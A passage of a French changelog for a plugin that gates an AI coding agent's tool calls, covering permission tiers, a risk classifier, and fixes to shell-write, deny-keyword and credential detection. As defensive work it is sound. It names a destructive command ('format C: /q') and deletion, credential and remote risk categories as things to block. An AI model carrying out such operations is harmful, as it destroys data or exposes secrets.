  session ou tout). Les lignes d'événements portent désormais `files`, `justification`,
  `verdict`, et `category`.
- **Registres terminaux d'approbation manuelle** : un `ask` routé vers un humain est suivi et
  soldé avec la réponse réelle de l'humain par un observateur passif `approval/request` —
  `allowed-once` → approuvé, `rejected` → rejeté, `cancelled` → annulé, `unavailable` → un refus
  (pas de canal d'approbation). `tools/result` solde le même ask en secours quand l'observateur
  ne peut pas le corréler (`callId` manquant, pas de service d'approbation, ou un écouteur plus
  tôt court-circuitant la cascade) ; « supprimer au règlement » est toute la règle de
  déduplication. Les approbations rapportent la progression d'apprentissage post-approbation
  (`n`/seuil), et le bandeau d'avis étiquette les trois états terminaux.

### Supprimé

- Le palier de permissions **Auto** retiré n'est plus réénoncé dans `cordis.patch.yml`. Le patch
  de bundle DSH remplace toute la table `permission.config.presets`, si bien que ce fichier
  devait porter chaque palier qui devait survivre — dont `auto`, que `dsh-auto-mode` apportait.
  Ce plugin est désinstallé : ses boutons étaient identiques à `workspace-write`, sa description
  « revue automatique / approbation en un coup » perdait son implémentation avec lui, et ce gate
  est inactif sur ce palier (`gatePresets` vaut par défaut `['permissive']`). Le sélecteur
  propose désormais les trois intégrés (`read-only` / `workspace-write` / `danger-full-access`,
  réénoncés depuis `@deepseek-ai/dsh-base/cordis.patch.yml`) plus le `permissive` de ce plugin.
- `test/patch-presets.spec.ts` épingle ce jeu de clés exact, si bien qu'un palier intégré ne
  peut plus être abandonné (ni un palier retiré ressuscité) sans faire échouer la suite.

### Modifié

- **Support DSH bi-version (0.1.0-rc.7 … 0.1.2-rc.1).** Un artefact couvre désormais
  `dsh-v0.1.1-rc.2` et `dsh-v0.1.2-rc.1` sans vérification de version. `effectivePolicy` est une
  méthode **privée** du service d'approbation utilisateur dans les deux versions ; elle est donc
  lue derrière une sonde `typeof` et une sonde qui lance ou manque se dégrade désormais en
  « politique inconnue » (l'ask tient) au lieu de faire échouer le chemin de décision.
  L'enregistrement des réglages garde `ctx.settings.register`, présent dans toute version
  prise en charge. `dsh.client.inject` ne nomme plus `@deepseek-ai/dsh-client-runtime` (retiré
  dans 0.1.2) ni `@deepseek-ai/dsh-client-ui-slots` (pas une ligne client dynamique dans aucune
  version) ; il liste désormais les vraies lignes client dans lesquelles il rend.
  `engines.dsh` et un tableau de compatibilité de versions s'ajoutent au README.
- Le gate est **actif uniquement dans les paliers de permissions listés dans `gatePresets`**
  (défaut `['permissive']`, le palier qu'ajoute ce plugin). Dans tout autre palier — Read Only,
  Workspace Write, Auto, Full access, `custom` — son flux de décision ne tourne pas du tout :
  aucun allow, aucun ask, aucun deny, aucun refus dur P0, aucun veto de mot-clé deny, aucun
  événement d'audit. `gatePresets: ['*']` rend le gate global à nouveau (refus dur compris) ; un
  embarquement qui ne passe aucun périmètre garde le comportement d'héritage.
- `llmAssist` emploie désormais le protocole de catégories de risque (sur-ensemble des verdicts
  allow/deny/ask précédents) ; `classifier.ts` partage un transport OpenAI-compatible unique
  (`chatCompletion`) avec le gradateur de risque. Les catégories de risque dures (`deletion` /
  `credential` / `remote` / `system` / `bulk`) **auto-refusent** désormais au lieu de router vers
  l'humain — l'opération est clairement dangereuse et aucune popup n'est nécessaire ; seul
  `risky:neutral` (incertain) atteint encore le seam humain.
- Les outils `write` / `edit` ont désormais un **défaut sensible au chemin** : les écritures
  internes au workspace suivent le `defaultAction` configuré (typiquement `allow`) ; les
  écritures vers des chemins en dehors de l'espace de travail de la session escaladent vers
  `ask` pour que le contenu puisse être revu. Le classificateur LLM peut ensuite auto-allow un
  contenu sûr ou auto-deny un contenu nuisible, si bien que seules les opérations réellement
  incertaines produisent une popup.

### Corrigé

- **Le « safe » de `llmAssist` auto-autorisait désormais réellement au lieu d'être seulement
  enregistré.** L'écouteur `tools/pre-execute` renvoyait l'`ask` immédiatement et gradait
  l'appel en arrière-plan, mais un ask remis à l'hôte est déjà en route vers les répondants
  d'approbation et DSH n'offre aucune API pour le rétracter (le `signal` propre de la requête ne
  peut que le solder `cancelled`). Le panneau apparaissait donc toujours et l'humain devait
  cliquer, tandis que le flux montrait l'auto-allow `safe` — et un `auto-deny` à risque dur
  n'atteignait jamais l'hôte du tout. L'écouteur attend désormais `refineAsk` **avant** de
  renvoyer la décision (`makePreExecuteListener`) : `safe` délègue via `next()` sans panneau, une
  catégorie à risque dur auto-refuse, et seul `risky:neutral` / `unresolved` / un échec du
  gradateur garde l'ask humain (fail-closed). L'attente est bornée par `riskTimeoutMs` (défaut
  20 s) et un appel déjà annulé saute la graduation.
- **La couche de motifs d'écriture shell ne tournait jamais pour l'outil shell principal de
  DSH.** `SHELL_TOOLS` listait `bash` / `pwsh` / `sh` / `cmd` / `powershell` mais pas **`shell`**
  (le nom d'outil propre de DSH) ni `terminal`, si bien que `git push`, `chmod`, `tee`, les
  redirections et tout autre motif d'écriture tombaient dans `defaultAction` au lieu d'escalader
  vers `ask`. La liste est désormais `shell` / `terminal` / `bash` / `pwsh` / `sh` / `cmd` /
  `powershell`, et la copie dupliquée dans `learning.ts` a été retirée (source unique dans
  `evaluate.ts`, pour que le chemin de décision et l'empreinte d'apprentissage ne puissent plus
  diverger).
- **La détection de redirection et de `tee` était trop étroite.** Seul `>>` correspondait, si
  bien que `echo x > /tmp/out.txt` et un `tee /tmp/log.txt` nu étaient traités comme en lecture
  seule. `> f` / `>> f` / `>f` escaladent désormais tandis que les idiomes stderr qu'une commande
  en lecture seule emploie (`2>&1`, `>&2`, `2>/dev/null`, `1>&2`) restent en lecture seule ;
  `curl` / `wget` escaladent seulement quand ils écrivent un fichier (`-o` / `-O` / `>`).
- **`decideRules` ignorait `args.command`.** Elle ne lisait que le `ctx.commandText` dérivé, si
  bien que tout appelant construisant un contexte à la main (tests, embarqueurs) perdait
  silencieusement l'inspection de commande. Elle retombe désormais sur `args.command`, à
  l'image de `PermGateRuntime.ctxFor`.
- **Le gate passait outre le palier de permissions choisi par l'utilisateur.** Il possède un
  palier d'approbation indépendant, mais il agissait dans *chaque* préréglage : tout
  franchissement devenait un `ask`, `dsh-tools` le transférait au seam d'approbation DSH, et sous
  le préréglage `danger-full-access` (`approval: never`) ce seam renvoie `rejected` **avant que
  tout répondant ne tourne** — aucun panneau n'était jamais rendu et tout appel non en lecture
  seule échouait avec le trompeur `the user rejected tool "..."`. Ses couches de refus dur et de
  mots-clés deny ignoraient pareillement le palier, si bien que `danger-full-access` (« accès
  complet sans invites d'approbation ») était silencieusement restreint. Le gate entier est
  désormais borné à `gatePresets` ; en dehors, le gate est inerte et n'enregistre rien. À
  l'intérieur d'un palier actif, un `ask` se dégrade toujours en passe-plat quand la politique
  d'approbation effective de la session est `never`, si bien qu'un ask sans réponse ne peut
  jamais devenir un refus.
- **La recherche en lecture seule et les outils propres à la session faisaient l'objet d'une
  demande.** `web_search` et `modlens_read_image` sont des requêtes en lecture seule et
  `todo_write` / `render_ui` / `validate_dsh_ui` / `ask_user_question` / `exit_plan_mode` /
  `ralph` / `workflow` sont de l'état de session ou de la délégation, mais aucun n'était dans la
  classification auto-allow, si bien que chacun levait un `ask` (la popup
  `no rule matched; default action`). Ils sont désormais auto-autorisés, et une nouvelle liste de
  configuration `autoAllowTools` étend la classification aux outils tiers en lecture seule. Le
  refus dur P0 et la couche de mots-clés deny tournent toujours en premier, si bien que la liste
  ne peut jamais élargir l'autorité.
- **Les `write` / `edit` vers des chemins en dehors du workspace passaient silencieusement à
  travers.** Un appel qui écrit vers `~/.bashrc` ou les fichiers d'un autre lecteur recevait le
  `defaultAction` configuré (typiquement `allow`) et s'exécutait sans revue. Un dépassement
  sensible au chemin s'applique désormais aux outils write/edit quand aucune règle ne
  correspond : les écritures internes au workspace suivent le `defaultAction` configuré, mais
  tout chemin cible en dehors de l'espace de travail de la session escalade vers `ask` pour que
  le contenu puisse être revu — le contenu nuisible est refusé ; les ajouts bénins sont
  auto-autorisés quand `llmAssist` est activé. Les règles deny explicites gagnent toujours
  quelle que soit la portée du chemin, et les règles allow explicites peuvent accorder l'accès
  aux chemins intérieurs mais ne jamais contourner la revue des chemins extérieurs.
- **La détection d'identifiants P0 scannait les corps de documents**, si bien qu'écrire ou
  éditer tout fichier mentionnant seulement un jeton, une clé privée ou `credentials.yaml` était
  refusé en dur. Elle ne scanne désormais que les arguments qui décrivent l'opération
  (`command`, `file_path`, …), à l'image de la règle existante de la couche de mots-clés deny :
  le texte d'un fichier n'est pas l'opération.
- **Un `$DSH_HOME/perm-gate/rules.yml` n'était jamais chargé.** `rulesFile` n'avait pas de
  défaut, si bien qu'une entrée de profil omettant `config` laissait le gate avec un jeu de
  règles vide et `defaultAction: ask` — le `defaultAction: allow` de l'utilisateur et ses règles
  `allow:` étaient silencieusement ignorés. `rulesFile` vaut désormais par défaut
  `<dataDir>/rules.yml` (comme `eventsFile` / `learningFile`), et le miroir de liste blanche de
  la carte de réglages écrit réellement là.
- **`format` mettait son veto au cmdlet PowerShell `Format-Table`.** Un trait d'union n'est pas
  une frontière de mot pour un identifiant de commande, si bien que la blacklist correspondait à
  `Format-Table` / `Format-List`. Les bords de mots-clés correspondent désormais aux caractères
  d'identifiant (`[A-Za-z0-9_-]`), si bien que `format C: /q` est toujours attrapé tandis que
  `Format-Table` et `mkfs.ext4` se comportent comme avant.
- **Chaque requête de lecture exigeait une approbation manuelle.** `read` / `read_image` / `grep` /
  `glob` / `ls` / `lsp` sont des opérations de lecture confinées au workspace qui ne peuvent rien
  modifier (le refus dur P0 bloque toujours les lectures de chemins sensibles en dehors de la
  racine du workspace). Elles sont désormais auto-autorisées. Il en va de même pour tous les
  outils internes de coordination DSH (`agent_teams_*`, `conversation_search`, `memory_*`,
  `get_goal` / `update_goal` / `create_goal`, `taskboard_*`, `job_*`, `list_agents` /
  `interrupt_agent` / `send_message`, `subagent` / `subagent_fork` / `terminal` / `skill`).

- **L'onglet Approvals ne résolvait aucun identifiant de session**, si bien qu'il ne listait
  rien tandis que la barre d'instantanés montrait l'inventaire global. Un occupant
  `conversation.view` reçoit les props standards au niveau supérieur (`sessionId` /
  `useSessions`) — la forme que consomme `ConversationRoot` — et non sous `slotsProps` ; la vue
  et le bandeau d'avis sondent désormais le niveau supérieur, la forme imbriquée et le hook de
  liste de sessions.
- **Les événements étaient enregistrés avec un identifiant de session vide**, si bien que
  l'onglet Approvals (qui filtre par la session courante) ne montrait rien alors que
  `events.jsonl` se remplissait. Le `ToolExecution` de DSH porte la session sur
  `agent.session.id` (cwd du workspace sur `agent.session.header.cwd`), et non sur
  `exec.sessionId` / `exec.cwd` ; les deux se lisent désormais depuis l'agent quand les champs
  directs sont absents.
- **La page de revue était silencieusement morte sur une installation par défaut** : avec une
  entrée de profil qui omet `config`, `dshHome` était vide, si bien que le répertoire de données
  était `undefined` et que le journal d'événements n'était jamais construit — pas de
  `events.jsonl`, pas d'instantanés, pas d'apprentissage persisté, et un 404 sur
  `GET /api/dsh-perm-gate/events`. `dshHome` se résout désormais vers une valeur explicite, sinon
  `$DSH_HOME`, sinon `~/.dsh`, si bien que `<dshHome>/perm-gate/{events.jsonl,learning.json,snapshots/}`
  est toujours écrit.
- La correspondance de mots-clés deny ne met plus son veto sur un mot-clé qui apparaît seulement
  à l'intérieur d'un identifiant plus long, et les arguments de corps de document (`content`,
  `new_string`, `old_string`, `text`, …) ne sont plus scannés du tout — le texte d'un fichier
  n'est pas l'opération. La correspondance tient compte des frontières de mots désormais, si bien
  que les mots-clés bordés de ponctuation et CJK continuent de fonctionner, et l'espace blanc est
  réduit pour qu'une commande écrite avec des espaces superflus soit toujours attrapée.


### Ajouté
- **Palier Permissive** — un mode d'approbation indépendant parallèle à read-only /
  workspace-write / full-access / whitelist. Un seul interrupteur front (`permissive`) plus des
  stratégies backend combinables (`trustAutoAllow` / `alwaysConfirm` / `llmAssist`) ; le refus
  dur P0 reste monotone.
- Sources de décision d'audit `classifier` / `permissive` ; hook `classify` injectable facultatif
  pour `llmAssist` (fail-closed sur `ask`/absence).
- **Client navigateur** — une page `settings.plugins.tab` (« Palier d'approbation Permissive »)
  se rend dans Réglages → Plugins : un interrupteur (`permissive`) + trois bascules de
  `permissiveStrategies` backend. L'hôte lit l'espace de noms en direct, si bien que les
  modifications s'appliquent à l'appel d'outil suivant sans redémarrage.
- Flag CLI `--permissive` et résumé permissive dans `--list`.
- **Vrai LLM llmAssist** — un classificateur OpenAI-compatible configurable
  (`classifierEndpoint` / `classifierModel`), invoqué pour trancher automatiquement un `ask` et
  fail-closed vers le seam humain.
- **Migration de liste blanche** — `approveAllowEverywhere` persiste un mot de commande dans la
  liste blanche `allow` du fichier de règles et recharge ; `approveRepeat` frappe un octroi de
  session borné. Les deux dosent les deux boutons allow étendus du panneau always-confirm.
- **Guides d'installation en quatre langues** — `INSTALL.md` / `INSTALL.zh.md` /
  `INSTALL.ja.md` / `INSTALL.ko.md` couvrant l'installation, la mise à niveau, la migration
  depuis les plugins séparés, la vérification et le dépannage ; chaque README gagne des liens de
  changement de langue, une note de compatibilité `ja` / `ko` (le `LOCALE_IDS` officiel de DSH
  est `["zh", "en"]`) et une référence de version.
- README.ja / README.ko étendus en miroirs complets de la source de vérité anglaise (table de la
  chaîne P0–P4, pourquoi/fonctionnalités, format du fichier de règles, palier Permissive, CLI).

## [0.1.0] - 2026-08-30

### Ajouté
- Chaîne de décision P0–P4 : refus dur, octroi de session, chaîne de règles statique deny-d'abord,
  classificateur optionnel (désactivé), `ask`.
- Moteur de règles à fonctions pures : compilation glob/regex avec borne ReDoS, analyse à échec
  bruyant, cache de compilation par hash de contenu.
- Liste blanche/noire de commandes via décomposition argv (récursion `sh -c`/`bash -c`,
  pipelines, redirections, recursive/force).
- Octrois de session précis indexés par empreinte canonique (TTL + maxUses, pas de réutilisation
  entre cibles).
- Audit de décision `{ignorable:true}` avec invariant modèle-visible⟺journalisé.
- Évaluateur CLI autonome en dry-run (`dsh-perm-gate --rules … --tool … --args …`).
- Contrat de plugin fonction cordis DSH (`cordis.patch.yml`, `Config` Schemastery,
  exports/types).
- README en 4 langues (en/zh/ja/ko) et ossature Keep-a-Changelog (en + ja + ko).
